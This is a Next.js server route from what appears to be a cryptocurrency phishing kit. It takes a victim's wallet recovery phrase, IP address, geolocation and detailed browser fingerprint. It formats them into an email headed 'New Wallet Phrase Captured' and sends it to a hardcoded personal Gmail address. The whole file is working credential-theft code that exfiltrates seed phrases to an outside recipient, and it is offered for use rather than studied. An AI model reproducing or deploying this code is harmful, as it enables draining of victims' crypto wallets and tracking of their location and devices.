import { NextRequest, NextResponse } from "next/server";
import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);

interface GeoData {
  ip?: string;
  city?: string;
  region?: string;
  country_name?: string;
  country_code?: string;
  org?: string;
  postal?: string;
  latitude?: number;
  longitude?: number;
  timezone?: string;
  utc_offset?: string;
  currency?: string;
}

function row(label: string, value: string | number | undefined | null) {
  if (!value && value !== 0) return "";
  return `
    <tr>
      <td style="padding:8px 12px;color:#94a3b8;font-size:13px;white-space:nowrap;border-bottom:1px solid #1e293b;">${label}</td>
      <td style="padding:8px 12px;color:#f1f5f9;font-size:13px;border-bottom:1px solid #1e293b;word-break:break-all;">${value}</td>
    </tr>`;
}

function section(title: string, rows: string) {
  return `
    <div style="margin-bottom:24px;">
      <div style="background:#1e40af;color:#fff;font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;padding:7px 14px;border-radius:6px 6px 0 0;">
        ${title}
      </div>
      <table style="width:100%;border-collapse:collapse;background:#0f172a;border-radius:0 0 6px 6px;overflow:hidden;">
        ${rows}
      </table>
    </div>`;
}

export async function POST(req: NextRequest) {
  const { phrase, wallet, browserData } = await req.json();

  // --- Get IP ---
  const forwarded = req.headers.get("x-forwarded-for");
  const ip = forwarded ? forwarded.split(",")[0].trim() : req.headers.get("x-real-ip") ?? "Unknown";

  // --- IP Geolocation via ipapi.co (free, no key needed) ---
  let geo: GeoData = {};
  try {
    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`, {
      headers: { "User-Agent": "WalletApp/1.0" },
    });
    if (geoRes.ok) geo = await geoRes.json();
  } catch { /* silent */ }

  const submittedAt = new Date().toUTCString();

  // --- Parse browser name from UA ---
  const ua: string = browserData?.userAgent ?? "";
  let browser = "Unknown";
  if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Edg/")) browser = "Microsoft Edge";
  else if (ua.includes("OPR") || ua.includes("Opera")) browser = "Opera";
  else if (ua.includes("Chrome")) browser = "Chrome";
  else if (ua.includes("Safari")) browser = "Safari";

  const mapLink = geo.latitude && geo.longitude
    ? `https://www.google.com/maps?q=${geo.latitude},${geo.longitude}`
    : null;

  const html = `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>New Submission</title></head>
<body style="margin:0;padding:0;background:#020617;font-family:'Segoe UI',Arial,sans-serif;">
  <table width="100%" cellpadding="0" cellspacing="0" style="background:#020617;padding:32px 0;">
    <tr><td align="center">
      <table width="620" cellpadding="0" cellspacing="0" style="max-width:620px;width:100%;">

        <!-- Header -->
        <tr><td style="background:linear-gradient(135deg,#1e40af 0%,#0f172a 100%);border-radius:12px 12px 0 0;padding:32px 32px 24px;text-align:center;">
          <div style="font-size:28px;margin-bottom:4px;">🔐</div>
          <h1 style="margin:0;color:#ffffff;font-size:20px;font-weight:700;letter-spacing:0.5px;">New Wallet Phrase Captured</h1>
          <p style="margin:6px 0 0;color:#94a3b8;font-size:13px;">${submittedAt}</p>
        </td></tr>

        <!-- Body -->
        <tr><td style="background:#0f172a;padding:28px 32px;border-radius:0 0 12px 12px;">

          <!-- Phrase -->
          <div style="margin-bottom:24px;">
            <div style="background:#1e40af;color:#fff;font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;padding:7px 14px;border-radius:6px 6px 0 0;">
              💰 Wallet &amp; Recovery Phrase
            </div>
            <div style="background:#020617;border-radius:0 0 6px 6px;padding:16px;">
              <p style="margin:0 0 8px;color:#94a3b8;font-size:12px;text-transform:uppercase;letter-spacing:1px;">Wallet</p>
              <p style="margin:0 0 16px;color:#60a5fa;font-size:18px;font-weight:700;">${wallet ?? "Not provided"}</p>
              <p style="margin:0 0 8px;color:#94a3b8;font-size:12px;text-transform:uppercase;letter-spacing:1px;">Recovery Phrase</p>
              <div style="background:#1e293b;border:1px solid #334155;border-radius:8px;padding:14px;font-family:monospace;font-size:14px;color:#f0abfc;line-height:1.8;word-break:break-word;">
                ${phrase}
              </div>
            </div>
          </div>

          <!-- Location -->
          ${section("📍 Location &amp; IP", [
            row("IP Address", ip),
            row("City", geo.city),
            row("Region", geo.region),
            row("Country", geo.country_name ? `${geo.country_name} (${geo.country_code})` : undefined),
            row("Postal Code", geo.postal),
            row("Coordinates", geo.latitude ? `${geo.latitude}, ${geo.longitude}` : undefined),
            row("Timezone", geo.timezone),
            row("UTC Offset", geo.utc_offset),
            row("ISP / Org", geo.org),
            row("Currency", geo.currency),
            mapLink ? row("Map", `<a href="${mapLink}" style="color:#60a5fa;">View on Google Maps</a>`) : "",
          ].join(""))}

          <!-- Browser & Device -->
          ${section("🖥️ Browser &amp; Device", [
            row("Browser", browser),
            row("User Agent", ua),
            row("Platform", browserData?.platform),
            row("Vendor", browserData?.vendor),
            row("Language", browserData?.language),
            row("All Languages", browserData?.languages),
            row("Screen", browserData?.screenWidth ? `${browserData.screenWidth} × ${browserData.screenHeight} (${browserData.colorDepth}-bit colour, ${browserData.devicePixelRatio}x DPR)` : undefined),
            row("Device Memory", browserData?.deviceMemoryGB ? `${browserData.deviceMemoryGB} GB` : undefined),
            row("CPU Cores", browserData?.hardwareConcurrency),
            row("Connection", browserData?.connectionType ? `${browserData.connectionType} · ${browserData.downlinkMbps} Mbps` : undefined),
            row("Cookies Enabled", browserData?.cookiesEnabled),
            row("Do Not Track", browserData?.doNotTrack),
          ].join(""))}

          <!-- Session -->
          ${section("🕒 Session Info", [
            row("Local Time", browserData?.localTime),
            row("Timezone (Client)", browserData?.timezone),
            row("Page URL", browserData?.pageUrl),
            row("Referrer", browserData?.referrer),
            row("Submitted At (UTC)", submittedAt),
          ].join(""))}

        </td></tr>

        <!-- Footer -->
        <tr><td style="padding:20px;text-align:center;">
          <p style="margin:0;color:#475569;font-size:11px;">WalletApp Capture System · Confidential</p>
        </td></tr>

      </table>
    </td></tr>
  </table>
</body>
</html>`;

  try {
    await resend.emails.send({
      from: "Wallet App <onboarding@resend.dev>",
      to: "uwemuwemetim@gmail.com",
      subject: `🔐 New Phrase Captured — ${wallet ?? "Unknown"} · ${geo.country_name ?? ip}`,
      html,
    });
    return NextResponse.json({ success: true });
  } catch (error) {
    return NextResponse.json({ success: false, error: (error as Error).message }, { status: 500 });
  }
}
